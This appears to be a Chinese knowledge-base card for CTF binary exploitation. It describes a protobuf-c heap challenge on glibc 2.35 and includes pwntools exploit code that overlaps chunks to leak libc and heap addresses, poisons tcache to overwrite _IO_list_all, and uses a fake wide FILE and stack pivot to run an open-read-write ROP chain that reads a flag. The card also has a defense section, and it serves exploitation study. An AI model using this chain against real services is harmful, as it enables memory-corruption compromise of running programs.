---
id: binary-pwn-heap-protobuf-c-free-overlap-fsop-orw
title: protobuf-c 协议堆题 free/overlap 链：content 长度控块伪造大 chunk 泄露 libc/heap，tcache 污染 _IO_list_all 走 wide FILE 魔术 gadget ORW
type: scenario
domain: binary
path: binary/pwn/heap
technique: protobuf-c-free-overlap-fsop-orw
tags:
- pwn
- heap
- protobuf
- protobuf-c
- glibc235
- free-overlap
- fsop
- io-list-all
- tcache
- seccomp
- orw
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V174
  verified_at: '2026-11-06T17:02:21+08:00'
  notes: 已对照原文核对：protobuf-c unpack 内部堆块干扰、content 长度控块、预留指针块与 edit(8,pd) 伪造 0x31/0x31/0xd10-0x30+0x211、free(1) 吞并、7x0x150 切分、free(20-26)+free(19)、show(11) 泄露与 libc+0x21ace0/heap-0x3d40 偏移均与原文 exp 一致；orw_addr=chunk0+0xf0 与原文公式化简一致；seccomp 仅杀 execve、fake wide FILE 经 _IO_wfile_jumps+libc+0x16a06a 迁栈 ORW 与原文一致。卡内已注明偏移依赖示例 glibc 2.35、PoC 为骨架需按目标重建。跳过项 protobuf-c 描述符逆向与既有 verified 卡 code-analysis-reverse-linux-protobuf-c-descriptor-recovery 重复，跳过成立。未复跑 exp。
url: /docs/binary/pwn/heap/binary-pwn-heap-protobuf-c-free-overlap-fsop-orw/
draft: false
kb_aliases:
- protobuf 堆题
- protobuf-c heap pwn
- protobuf 序列化堆块
- free overlap 泄露
- tcache 污染 _IO_list_all
- wide FILE 魔术 gadget
- seccomp ORW
---

## 一句话结论

在基于 protobuf-c 的高版本 glibc 堆题里，消息解包会额外分配/释放消息结构体与 bytes 缓冲，常规 UAF 与堆叠会被内部块打乱；利用 `content` 长度控制目标堆块大小，预留指针块后通过重叠编辑伪造大 chunk 头并 free 入 unsorted，切分后从重叠槽读出 libc/heap；再用 safe-linking 编码的 tcache 污染把 `_IO_list_all` 改成堆上 fake wide FILE，退出时经 `_IO_wfile_jumps` + libc 魔术 gadget 迁栈到 ORW 链读取 flag（seccomp 只杀 execve）。

## 原理

- **协议即分配器入口**：目标用 `msg__msg__unpack(0, size, ptr)` 解析 length-prefixed 的 protobuf 消息，`bytes content` 字段在 C 结构中是 `{size_t len; uint8_t *data}`，解包时按 `len` 分配数据缓冲；消息结构体本身、repeated 数组等也会额外 malloc。处理完请求后 `protobuf_c_message_free_unpacked` 又把这些块 free 掉。每次 add/edit/free/show 都会带来一串内部小块的分配与释放，tcache/fastbin/unsorted 被持续搅动，直接按普通堆题做 UAF/堆叠往往对不上布局。
- **可控点**：业务层把 `content` 长度同时记入 `heap_size[idx]` 并按该长度分配；`show` 要求 `used_sign[idx]` 为真后 `write(1, heap_list[idx], heap_size[idx])`。free 后若指针/长度/标志未被完整清理，就存在 stale slot；再让另一个块与它重叠，就能用“仍为 used 的槽”读出已释放 chunk 的 `fd/bk`。
- **预留与伪造**：先分配小块占住后续要用的指针槽，再分配多组 0x200/0x280/0x300 的 content 块，把后续操作与 protobuf 内部块隔开；free 掉目标槽与相邻块、用 0x100/0x20 申请把 tcache 填到预期状态后，通过重叠写（对 UAF 槽执行 edit）写入伪造 chunk 头：`0x31`、`0x31` 和加大的 size `0xd10-0x30+0x211`。随后 free 相邻槽，让伪造的大块进入 unsorted 并吞掉中间的“纯净指针”块。
- **切分与泄露**：用 7 次 0x150 申请把大块切碎，再 free 一组 0x290 块与 19 号块，使一个仍带 used 标志的槽（示例为 11）与实际已释放的 unsorted 块重叠；`show(11)` 按旧 `heap_size` 读出该块内容，`fd` 指向 `main_arena+0x60`（示例 libc 中为 `libc+0x21ace0`），`bk` 附近带堆指针，从而同时得到 libc 与 heap 基址。
- **FSOP 写原语**：glibc 2.35 的 tcache `fd` 使用 safe-linking，编码值为 `target ^ (chunk_addr >> 12)`；文章用 `target = _IO_list_all ^ (heap >> 12)` 写入已释放 chunk 的 fd，再连续 add 让 malloc 返回 `_IO_list_all`，最后 `add(flat(file_addr))` 把 FILE 链表头改成堆上的 fake FILE。
- **fake wide FILE**：fake FILE 布置在已知堆地址，主 vtable 指向合法的 `_IO_wfile_jumps`（绕过 vtable 区间校验），`_wide_data` 指向自身或可控区，fake wide vtable 的 `__doallocate` 指向 libc 魔术 gadget（示例 `libc+0x16a06a`）。该 gadget 按受控的 `rax/rbp/rdi` 关系落到 `leave; ret`，把栈迁到 fake FILE 后面的 ORW 链。
- **ORW 而非 execve**：题目 seccomp 是黑名单，只有 `execve` 被 KILL，其余 syscall ALLOW；因此链子只需 `close(0)` → `open("./flag")`（返回 fd 0）→ `read(0, buf, n)` → `write(1, buf, n)` 即可。触发点是向程序发送无效选择让其退出，`exit()` 走 `_IO_flush_all_lockp` 遍历 `_IO_list_all`，命中 fake FILE。

## 触发条件

- 64 位 protobuf-c 协议堆题或类似服务：消息由 `content`/`bytes` 字段承载，长度直接影响堆分配；存在 add/edit/free/show 菜单与 stale slot/UAF 或重叠写机会。
- glibc 2.35（文章环境）；`main_arena`、`_IO_list_all`、`_IO_wfile_jumps`、`_IO_stdfile_2_lock` 与魔术 gadget 偏移需按目标 libc 重新核对。
- 能构造合法 protobuf 消息（已恢复 schema），并能让程序走到 `exit()`/`main` 返回以触发 FILE 刷新。
- 已获得 libc 与 heap 基址（本卡第一步的泄露）。

## 利用步骤

1. 恢复 `.proto` 并生成 pb2，封装 `tep/add/edit/free/show`；每条消息前发 `p64(len(pay))`。
2. 预留两个小块占住指针槽，再铺 7×0x300、9×0x200、8×0x280 的 content 块，尽量隔开 protobuf 内部临时块。
3. free 0/1、2-8、9，制造 tcache/unsorted 状态；用 0x100 与 0x20 申请填充 tcache。
4. 对重叠/UAF 槽 `edit` 伪造 chunk 头与大 size（示例 `0x31`、`0x31`、`0xd10-0x30+0x211`），free 相邻槽让大块进 unsorted 并吞并指针块。
5. 用 7 次 0x150 切分大块，free 20-26 与 19，`show(11)` 读出重叠的 unsorted 块，解析 libc/heap。
6. 计算 gadget 与 `file_addr`；在堆上布置 fake wide FILE 与 ORW 链。
7. 把 `_IO_list_all ^ (heap>>12)` 写入多个已释放 tcache 块的 fd，连续 add 使 malloc 返回 `_IO_list_all`，写入 `file_addr`。
8. 发送无效选择触发退出，`_IO_flush_all_lockp` → fake wide FILE → 魔术 gadget → `leave; ret` → ORW 输出 flag。

## PoC

布局与泄露骨架（索引/偏移取自文章示例，需按目标重建）：

```python
from pwn import *

# add(content)/edit(idx,content)/free(idx)/show(idx)：内部用 protobuf 序列化并加 8 字节长度前缀

add(b'a'*0x10); add(b'a'*0x10)          # 预留指针槽
for _ in range(7):  add(b'b'*0x300)     # 2-8
for _ in range(9):  add(b'a'*0x200)     # 9-18
for _ in range(8):  add(0x280*b'a')     # 19-26
free(0); free(1)
for i in range(7):  free(i+2)
free(9)
add(0x100*b'a'); add(b'a'*0x20)         # 填 tcache、推动切割

pd  = b'@'*0x18 + p64(0x31)
pd += b'@'*0x28 + p64(0x31)
pd += b'@'*0x28 + p64(0xd10-0x30+0x211) # 伪造大 chunk 的 size
edit(8, pd)                              # 通过重叠/UAF 槽写进下一个块的头部
free(1)                                  # 让伪造大块进 unsorted 并吞并指针块

for _ in range(7): add(b'a'*0x150)       # 切分大块
for i in range(7): free(20+i)
free(19)
show(11)                                 # 从重叠槽读 unsorted 块
# libc_base = u64(recvuntil(b'\x7f')[-6:].ljust(8,b'\0')) - 0x21ace0
# heap_base = u64(recv(6).ljust(8,b'\0')) - 0x3d40
```

FSOP 关键片段（偏移按目标 libc 调整）：

```python
file_addr = heap_base + 0x4ca0
orw_addr  = file_addr + 0xf0

# fake _IO_FILE：合法 _IO_wfile_jumps + fake wide vtable + 魔术 gadget
# 按 struct _IO_FILE 字段顺序布置 _mode/_wide_data 等，尾部关键值为：
#   vtable   = libc.sym['_IO_wfile_jumps']
#   wide_vt  = file_addr + 0x80
#   doalloc  = libc_base + 0x16a06a
# 其后接 ORW：
orw  = b'./flag\x00\x00'
orw += p64(add_rsp18) + p64(0) + p64(pivot_addr)
orw += p64(leave_ret)
orw += p64(pop_rdi) + p64(0) + p64(close_addr)
orw += p64(pop_rdi) + p64(orw_addr) + p64(pop_rsi) + p64(0)
orw += p64(pop_rax) + p64(2) + p64(syscall)          # open("./flag")
orw += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(orw_addr+0x100)
orw += p64(pop_rdx12) + p64(0x50) + p64(0) + p64(read_addr)
orw += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(orw_addr+0x100)
orw += p64(pop_rdx12) + p64(0x50) + p64(0) + p64(write_addr)

# tcache 污染 _IO_list_all（safe-linking）
target = (libc_base + libc.sym['_IO_list_all']) ^ (heap_base >> 12)
for idx in (16, 1, 2, 0):
    free(idx); edit(idx, p64(target))
add(b'a'*0x10); add(flat(file_addr))     # malloc 返回 _IO_list_all 并写入 fake FILE

# 发送无效选择触发 exit -> _IO_flush_all_lockp
s(p64(0)); s(p64(0))
interactive()
```

文章完整脚本还包含 `fake_io` 各字段的具体值、`_IO_stdfile_2_lock`、`add rsp,0x18; ret` gadget 与 `libc+0x16a06a` 的 rax/rbp/rdi 推导；这些偏移仅对示例 libc 成立，必须按目标重新查找，不要照抄。

## 变体与关联

- protobuf-c 内部块干扰的根因是每次解包都 malloc/free 消息结构与 bytes 缓冲；若目标把 `content` 拷贝到固定缓冲或使用 arena，布局会不同，需要重新调整预留块数量。
- FSOP 写原语可替换：largebin attack 改 `_IO_list_all` 见 [[binary-pwn-heap-largebin-io-list-all-wide-file-setcontext-orw]]；House of Apple 2 覆盖 `_IO_2_1_stderr_` 见 [[binary-pwn-heap-house-of-apple-2-stderr-fsop]]；本卡的差异是用 tcache poisoning + safe-linking 编码直达 `_IO_list_all`，并用 `libc+0x16a06a` 魔术 gadget + `leave; ret` 迁栈，而非 setcontext。
- schema 恢复方法见 [[code-analysis-reverse-linux-protobuf-c-descriptor-recovery]]；若二进制没有描述符，可用 `protoc --decode_raw` 或动态调试恢复字段。
- seccomp 仅杀 execve 时 ORW 足够；若目标改用 allowlist 只允许 read/write 而不允许 open，需要换 openat2 或已有 fd 的读取路径。

## 检测与防御

- 对题目/服务设计：free 时清空指针、长度与 used 标志，show 严格用当前分配长度而不是历史长度；对 content 长度做上限与一致性校验，避免长度与真实 chunk size 脱节。
- 堆加固：开启 glibc safe-linking、tcache double-free 检查、`malloc_consolidate` 相关检测；对 `_IO_list_all` 与 vtable 做完整性校验（注意 `_IO_wfile_jumps` 是合法 vtable，可绕过区间检查）。
- seccomp 用 allowlist 而非“只杀 execve”的黑名单；即使禁止 execve，open/read/write 仍足以读 flag。
- 监控：异常的大量同尺寸 malloc/free、free 后仍被读取的 slot、`_IO_list_all` 指向堆地址、进程退出时的 FILE 刷新路径异常。
